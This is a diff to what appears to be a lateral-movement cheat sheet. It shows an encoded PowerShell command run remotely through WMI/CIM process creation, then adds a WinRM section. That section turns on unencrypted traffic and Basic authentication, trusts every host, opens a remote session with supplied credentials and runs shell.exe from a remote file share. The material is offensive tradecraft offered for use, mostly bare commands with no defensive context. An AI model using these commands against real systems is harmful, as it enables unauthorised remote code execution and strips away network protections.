@@ -17,3 +17,21 @@ $Command = "powershell.exe -encodedCommand $SBEncoded -ExecutionPolicy Bypass -N
 Invoke-CimMethod -CimSession $Session -Namespace root\cimv2 -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command}
 
 ```
+
+
+### WinRM 
+```
+Enable-PSRemoting -Force
+winrm quickconfig
+winrm set winrm/config/service '@{AllowUnencrypted="true"}'
+Set-Item WSMan:localhost\client\trustedhosts -value *
+
+cd WSMan:\localhost\Client
+set-item .\allowunencrypted $true
+set-item  WSMan:\localhost\Service\Auth\Basic $true # For domain environment
+set-item  WSMan:\localhost\Service\AllowUnencrypted $true# For domain environment
+
+New-PSSession -ComputerName 192.168.1.2 -Credential (Get-Credential)
+Enter-PSSession 2
+cmd.exe /c \\192.168.1.4\sharename\shell.exe
+```
